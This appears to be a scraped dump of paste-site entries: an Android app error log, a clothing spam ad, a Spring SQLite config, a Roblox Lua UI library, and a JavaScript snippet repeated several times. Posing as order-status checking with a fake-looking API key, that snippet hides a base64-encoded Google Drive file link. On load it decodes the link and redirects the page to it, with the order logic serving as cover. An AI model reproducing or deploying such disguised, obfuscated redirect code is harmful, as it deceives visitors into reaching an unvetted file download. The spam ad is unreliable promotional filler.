  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1JjS4Ht7,2025-04-09T09:47:07.094160,powerampache,PHP,Wednesday 9th of April 2025 02:47:07 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.13.229.1 (port 45780) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

getSongsFromAlbum() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.13.229.1 (port 45780) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.13.229.1 (port 45780) after 15000ms\"" }"",""stackTrace"":[]}"
ifac95wh,Helloqueen's pole dance clothing,helloqueen12,HTML,Wednesday 9th of April 2025 02:44:23 AM CDT,"Unleash your inner goddess with Helloqueen's pole dance clothing line.

• Premium, flexible fabrics for maximum comfort and mobility
• Unique, flattering cuts that accentuate your curves
• Designed by dance enthusiasts for dance enthusiasts
• Ethically made with care by our family-owned business

Helloqueen is more than just activewear - it's a celebration of the female form. Our sports clothes are crafted to make you feel confident, powerful, and radiant as you dance your heart out. Whether you're a seasoned pole pro or just starting your fitness journey, Helloqueen will elevate your experience and help you shine.
<a href=""http://helloqueen.pl/http://helloqueen.pl/o-nas/http://helloqueen.pl/kontakt/http://helloqueen.pl/sklep/http://helloqueen.pl/stroje-pole-dance/"">http://helloqueen.pl/http://helloqueen.pl/o-nas/http://helloqueen.pl/kontakt/http://helloqueen.pl/sklep/http://helloqueen.pl/stroje-pole-dance/</a>

"
pK1mcvLM,Untitled,Ratqueenkslskskwkw,JavaScript,Wednesday 9th of April 2025 02:44:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/74990/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
X6Le9wQF,Untitled,SimonAnkov,Java,Wednesday 9th of April 2025 02:33:48 AM CDT,"import jakarta.persistence.EntityManagerFactory;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.HashMap;
import javax.sql.DataSource;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.orm.jpa.EntityManagerFactoryBuilder;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.Resource;
import org.springframework.core.io.ResourceLoader;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.jdbc.datasource.DriverManagerDataSource;
import org.springframework.orm.jpa.JpaTransactionManager;
import org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;
import org.springframework.transaction.PlatformTransactionManager;

@Configuration
@EnableJpaRepositories(
        basePackages = ""com.template.plex.repository.sqlite"",
        entityManagerFactoryRef = ""sqliteEntityManagerFactory"",
        transactionManagerRef = ""sqliteTransactionManager""
)
public class SqliteConfig {

    @Bean(name = ""sqliteDataSource"")
    public DataSource sqliteDataSource(ResourceLoader resourceLoader,
            @Value(""${spring.datasource.sqlite.dbName}"") String dbFileName) {
        DriverManagerDataSource dataSource = new DriverManagerDataSource();
        dataSource.setDriverClassName(""org.sqlite.JDBC"");

        String resourcePath = ""classpath:db/sqlite/"" + dbFileName;
        Resource sqliteResource = resourceLoader.getResource(resourcePath);

        if (!sqliteResource.exists()) {
            throw new IllegalArgumentException(""SQLite DB file "" + dbFileName
                    + "" not found in resources (expected at "" + resourcePath + "")"");
        }

        File tempDbFile;
        try {
            tempDbFile = File.createTempFile(""sqlite-migration-"", "".db"");
            Files.copy(sqliteResource.getInputStream(), tempDbFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
        } catch (IOException e) {
            throw new RuntimeException(""Failed to create temporary SQLite DB file"", e);
        }

        dataSource.setUrl(""jdbc:sqlite:"" + tempDbFile.getAbsolutePath());
        return dataSource;
    }

    @Bean(name = ""sqliteEntityManagerFactory"")
    public LocalContainerEntityManagerFactoryBean sqliteEntityManagerFactory(
            EntityManagerFactoryBuilder builder,
            @Qualifier(""sqliteDataSource"") DataSource dataSource) {

        HashMap<String, Object> jpaProps = new HashMap<>();
        jpaProps.put(""hibernate.hbm2ddl.auto"", ""none"");
        jpaProps.put(""hibernate.default_schema"", """");
        jpaProps.put(""hibernate.dialect"", ""org.hibernate.community.dialect.SQLiteDialect"");

        return builder
                .dataSource(dataSource)
                .packages(""com.template.plex.model.external"")
                .persistenceUnit(""sqlite"")
                .properties(jpaProps)
                .build();
    }

    @Bean(name = {""sqliteTransactionManager"", ""transactionManager""})
    public PlatformTransactionManager sqliteTransactionManager(
            @Qualifier(""sqliteEntityManagerFactory"") EntityManagerFactory emf) {
        return new JpaTransactionManager(emf);
    }
}
"
5m4eW2me,Products.js,Ratqueenkslskskwkw,JavaScript,Wednesday 9th of April 2025 02:28:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23220/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7KEF1QMk,UI Lib,SLEEZESE,Lua,Wednesday 9th of April 2025 02:27:33 AM CDT,"local SimpleUI = {}

function SimpleUI.NewWindow(title)
    -- Create main window
    local screenGui = Instance.new(""ScreenGui"")
    screenGui.Name = ""SimpleUI_""..title
    screenGui.Parent = game:GetService(""Players"").LocalPlayer:WaitForChild(""PlayerGui"")

    local mainFrame = Instance.new(""Frame"")
    mainFrame.Name = ""MainFrame""
    mainFrame.Size = UDim2.new(0, 300, 0, 400)
    mainFrame.Position = UDim2.new(0.5, -150, 0.5, -200)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    mainFrame.Parent = screenGui

    -- Title bar
    local titleBar = Instance.new(""TextLabel"")
    titleBar.Size = UDim2.new(1, 0, 0, 25)
    titleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    titleBar.Text = title
    titleBar.TextColor3 = Color3.white
    titleBar.Font = Enum.Font.GothamBold
    titleBar.Parent = mainFrame

    -- Content frame
    local content = Instance.new(""ScrollingFrame"")
    content.Size = UDim2.new(1, 0, 1, -25)
    content.Position = UDim2.new(0, 0, 0, 25)
    content.BackgroundTransparency = 1
    content.ScrollBarThickness = 5
    content.AutomaticCanvasSize = Enum.AutomaticSize.Y
    content.Parent = mainFrame

    local layout = Instance.new(""UIListLayout"")
    layout.Padding = UDim.new(0, 5)
    layout.Parent = content

    -- Dragging functionality
    local dragging, dragInput, dragStart, startPos

    titleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = mainFrame.Position
        end
    end)

    titleBar.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)

    game:GetService(""UserInputService"").InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            mainFrame.Position = startPos + UDim2.new(0, delta.X, 0, delta.Y)
        end
    end)

    local window = {}

    -- SECTION
    function window.Section(name)
        local section = Instance.new(""Frame"")
        section.Size = UDim2.new(1, -10, 0, 0)
        section.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        section.Parent = content

        local sectionTitle = Instance.new(""TextLabel"")
        sectionTitle.Size = UDim2.new(1, 0, 0, 25)
        sectionTitle.BackgroundTransparency = 1
        sectionTitle.Text = ""  ""..name
        sectionTitle.TextColor3 = Color3.white
        sectionTitle.Font = Enum.Font.Gotham
        sectionTitle.TextXAlignment = Enum.TextXAlignment.Left
        sectionTitle.Parent = section

        local sectionContent = Instance.new(""Frame"")
        sectionContent.Size = UDim2.new(1, 0, 0, 0)
        sectionContent.BackgroundTransparency = 1
        sectionContent.Parent = section

        local sectionLayout = Instance.new(""UIListLayout"")
        sectionLayout.Padding = UDim.new(0, 5)
        sectionLayout.Parent = sectionContent

        sectionLayout:GetPropertyChangedSignal(""AbsoluteContentSize""):Connect(function()
            sectionContent.Size = UDim2.new(1, 0, 0, sectionLayout.AbsoluteContentSize.Y)
            section.Size = UDim2.new(1, -10, 0, sectionTitle.AbsoluteSize.Y + sectionContent.AbsoluteSize.Y)
        end)

        local elements = {}

        -- BUTTON
        function elements.Button(props)
            local button = Instance.new(""TextButton"")
            button.Size = UDim2.new(1, 0, 0, 30)
            button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
            button.TextColor3 = Color3.white
            button.Text = props.Text or ""Button""
            button.Parent = sectionContent

            button.MouseButton1Click:Connect(function()
                if props.Callback then pcall(props.Callback) end
            end)
        end

        -- TOGGLE
        function elements.Toggle(props)
            local toggle = Instance.new(""TextButton"")
            toggle.Size = UDim2.new(1, 0, 0, 30)
            toggle.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
            toggle.TextColor3 = Color3.white
            toggle.Text = props.Text.."": Off""
            toggle.Parent = sectionContent

            local state = props.Default or false

            local function update()
                toggle.Text = props.Text.."": ""..(state and ""On"" or ""Off"")
                toggle.BackgroundColor3 = state and Color3.fromRGB(0, 170, 127) or Color3.fromRGB(60, 60, 60)
                if props.Callback then pcall(props.Callback, state) end
            end

            toggle.MouseButton1Click:Connect(function()
                state = not state
                update()
            end)

            update()
        end

        -- SLIDER
        function elements.Slider(props)
            local slider = Instance.new(""Frame"")
            slider.Size = UDim2.new(1, 0, 0, 40)
            slider.BackgroundTransparency = 1
            slider.Parent = sectionContent

            local title = Instance.new(""TextLabel"")
            title.Size = UDim2.new(1, 0, 0, 15)
            title.BackgroundTransparency = 1
            title.Text = props.Text or ""Slider""
            title.TextColor3 = Color3.white
            title.Font = Enum.Font.Gotham
            title.TextXAlignment = Enum.TextXAlignment.Left
            title.Parent = slider

            local track = Instance.new(""Frame"")
            track.Size = UDim2.new(1, 0, 0, 5)
            track.Position = UDim2.new(0, 0, 0, 20)
            track.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
            track.Parent = slider

            local fill = Instance.new(""Frame"")
            fill.Size = UDim2.new(0.5, 0, 1, 0)
            fill.BackgroundColor3 = Color3.fromRGB(0, 170, 127)
            fill.Parent = track

            local value = Instance.new(""TextLabel"")
            value.Size = UDim2.new(0, 50, 0, 15)
            value.Position = UDim2.new(1, 5, 0, 0)
            value.BackgroundTransparency = 1
            value.Text = tostring(props.Default or 50)
            value.TextColor3 = Color3.white
            value.Font = Enum.Font.Gotham
            value.Parent = track

            local min = props.Min or 0
            local max = props.Max or 100
            local current = props.Default or 50

            local function update(val)
                current = math.clamp(val, min, max)
                local ratio = (current - min) / (max - min)
                fill.Size = UDim2.new(ratio, 0, 1, 0)
                value.Text = string.format(""%.1f"", current)
                if props.Callback then pcall(props.Callback, current) end
            end

            local dragging = false
            track.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 then
                    dragging = true
                    local x = input.Position.X - track.AbsolutePosition.X
                    update(min + (x / track.AbsoluteSize.X) * (max - min))
                end
            end)

            track.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 then
                    dragging = false
                end
            end)

            game:GetService(""UserInputService"").InputChanged:Connect(function(input)
                if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
                    local x = input.Position.X - track.AbsolutePosition.X
                    update(min + (x / track.AbsoluteSize.X) * (max - min))
                end
            end)

            update(current)
        end

        -- TEXTBOX
        function elements.Textbox(props)
            local textbox = Instance.new(""TextBox"")
            textbox.Size = UDim2.new(1, 0, 0, 30)
            textbox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
            textbox.TextColor3 = Color3.white
            textbox.PlaceholderText = props.Placeholder or ""Enter text...""
            textbox.Text = props.Text or """"
            textbox.Parent = sectionContent

            textbox.FocusLost:Connect(function()
                if props.Callback then pcall(props.Callback, textbox.Text) end
            end)
        end

        -- DROPDOWN
        function elements.Dropdown(props)
            local dropdown = Instance.new(""TextButton"")
            dropdown.Size = UDim2.new(1, 0, 0, 30)
            dropdown.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
            dropdown.TextColor3 = Color3.white
            dropdown.Text = props.Text or ""Select...""
            dropdown.Parent = sectionContent

            local optionsFrame = Instance.new(""Frame"")
            optionsFrame.Size = UDim2.new(1, 0, 0, 0)
            optionsFrame.Position = UDim2.new(0, 0, 1, 5)
            optionsFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            optionsFrame.Visible = false
            optionsFrame.Parent = dropdown

            local optionsLayout = Instance.new(""UIListLayout"")
            optionsLayout.Parent = optionsFrame

            for _, option in ipairs(props.Options or {}) do
                local optionButton = Instance.new(""TextButton"")
                optionButton.Size = UDim2.new(1, 0, 0, 25)
                optionButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
                optionButton.TextColor3 = Color3.white
                optionButton.Text = option
                optionButton.Parent = optionsFrame

                optionButton.MouseButton1Click:Connect(function()
                    dropdown.Text = props.Text.."": ""..option
                    optionsFrame.Visible = false
                    if props.Callback then pcall(props.Callback, option) end
                end)
            end

            dropdown.MouseButton1Click:Connect(function()
                optionsFrame.Visible = not optionsFrame.Visible
                optionsFrame.Size = UDim2.new(1, 0, 0, #props.Options * 25)
            end)

            game:GetService(""UserInputService"").InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 and optionsFrame.Visible then
                    if not dropdown:IsDescendantOf(input.Target) then
                        optionsFrame.Visible = false
                    end
                end
            end)
        end

        -- LABEL
        function elements.Label(props)
            local label = Instance.new(""TextLabel"")
            label.Size = UDim2.new(1, 0, 0, 20)
            label.BackgroundTransparency = 1
            label.Text = props.Text or ""Label""
            label.TextColor3 = Color3.white
            label.Font = Enum.Font.Gotham
            label.TextXAlignment = Enum.TextXAlignment.Left
            label.Parent = sectionContent
        end

        return elements
    end

    return window
end

return SimpleUI"
VG65JX3f,Order.js,Ratqueenkslskskwkw,JavaScript,Wednesday 9th of April 2025 02:13:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97245/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
